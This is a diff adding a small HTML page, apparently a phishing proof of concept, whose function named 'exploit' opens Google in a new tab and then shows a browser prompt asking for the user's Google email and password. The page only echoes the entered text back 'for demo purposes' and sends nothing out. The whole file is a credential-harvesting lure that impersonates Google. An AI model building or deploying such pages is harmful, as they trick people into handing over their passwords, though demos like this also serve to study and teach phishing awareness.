@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+  <body>
+
+    <script>
+      function exploit() {
+        // Open Google in a new tab (to make it seem legitimate)
+        window.open("https://www.google.com");
+
+        // Prompt the user for credentials
+        const userInput = prompt("To continue to Google\nPlease login with your email and password:", "Email / Password");
+        
+        // Display the entered data on the page (for demo purposes)
+        if (userInput) {
+          const outputDiv = document.createElement("div");
+          outputDiv.textContent = `Entered Credentials: ${userInput}`;
+          document.body.appendChild(outputDiv);
+        }
+      }
+    </script>
+
+    <a href="#" onclick="exploit();">
+      <h1>Click here to go to Google.com</h1>
+    </a>
+
+  </body>
+</html>
